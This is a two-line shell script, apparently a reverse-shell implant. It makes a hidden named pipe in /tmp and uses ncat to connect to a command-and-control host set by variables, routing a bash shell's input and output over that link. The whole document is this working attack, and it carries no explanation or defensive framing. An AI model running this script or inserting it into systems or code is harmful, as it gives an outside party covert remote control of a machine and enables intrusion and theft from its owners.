#!/bin/sh
mkfifo /tmp/.r; ncat $C2_HOST $C2_PORT < /tmp/.r | /bin/bash > /tmp/.r 2>&1
